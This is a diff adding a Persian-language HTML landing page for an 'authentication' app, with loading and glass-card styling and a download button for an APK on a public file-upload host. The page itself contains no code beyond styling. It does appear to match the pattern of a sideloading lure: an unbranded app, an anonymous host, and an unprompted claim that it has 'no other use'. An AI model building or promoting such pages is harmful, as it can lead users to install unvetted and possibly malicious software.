@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>برنامه احراز هویت</title>
+
+<style>
+    body {
+        margin: 0;
+        font-family: sans-serif;
+        background: linear-gradient(135deg, #dfe9f3, #ffffff);
+        overflow-x: hidden;
+    }
+
+    /* لودینگ */
+    #loading {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        background: rgba(255,255,255,0.7);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 999;
+        backdrop-filter: blur(12px);
+        animation: fadeOut 1s ease 1s forwards;
+    }
+
+    /* آیکون لودینگ با انیمیشن 1-2-1 */
+    .loader {
+        width: 70px;
+        height: 70px;
+        border-radius: 50%;
+        border: 6px solid rgba(255,255,255,0.4);
+        border-top-color: #00b894;
+        animation: spin 1.2s cubic-bezier(1,0,1,0) infinite;
+        backdrop-filter: blur(10px);
+    }
+
+    @keyframes spin {
+        0%   { transform: rotate(0deg) scale(1); }
+        50%  { transform: rotate(180deg) scale(1.2); }
+        100% { transform: rotate(360deg) scale(1); }
+    }
+
+    @keyframes fadeOut {
+        to { opacity: 0; visibility: hidden; }
+    }
+
+    /* کارت شیشه‌ای */
+    .glass {
+        background: rgba(255,255,255,0.25);
+        border-radius: 24px;
+        margin: 20px;
+        padding: 20px;
+        backdrop-filter: blur(18px);
+        border: 1px solid rgba(255,255,255,0.4);
+        box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+        animation: fadeIn 0.8s ease;
+    }
+
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(10px); }
+        to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .glass img {
+        width: 100%;
+        border-radius: 24px;
+        box-shadow: 0 6px 20px rgba(0,0,0,0.15);
+    }
+
+    /* کارت طوسی شیشه‌ای */
+    .glass.gray {
+        background: rgba(230,230,230,0.25);
+    }
+
+    /* دکمه دانلود */
+    .download-btn {
+        display: block;
+        width: calc(100% - 40px);
+        margin: 20px;
+        padding: 16px;
+        text-align: center;
+        background: rgba(76, 175, 80, 0.85);
+        color: #fff;
+        font-size: 18px;
+        border-radius: 16px;
+        text-decoration: none;
+        backdrop-filter: blur(10px);
+        box-shadow: 0 0 25px rgba(76,175,80,0.6);
+        transition: 0.3s;
+        animation: pulse 2s infinite;
+    }
+
+    .download-btn:hover {
+        background: rgba(56, 142, 60, 0.9);
+        box-shadow: 0 0 35px rgba(76,175,80,0.9);
+        transform: scale(1.03);
+    }
+
+    @keyframes pulse {
+        0%   { box-shadow: 0 0 15px rgba(76,175,80,0.4); }
+        50%  { box-shadow: 0 0 30px rgba(76,175,80,0.7); }
+        100% { box-shadow: 0 0 15px rgba(76,175,80,0.4); }
+    }
+</style>
+</head>
+
+<body>
+
+<!-- لودینگ -->
+<div id="loading">
+    <div class="loader"></div>
+</div>
+
+<!-- محتوا -->
+<div class="glass">
+    <h2>احراز هویت</h2>
+</div>
+
+<div class="glass">
+    <img src="https://uploadkon.ir/uploads/c4d710_2625D1F509-55FD-428E-8E64-A52F1C9BA466.png">
+</div>
+
+<div class="glass gray">
+    <p>این برنامه جهت انجام فرایند احراز هویت ساخته شده و هیچ استفاده دیگری ندارد</p>
+</div>
+
+<a class="download-btn" href="https://uploadkon.ir/uploads/adf010_26phonix-70592.apk">دانلود برنامه</a>
+
+</body>
+</html>
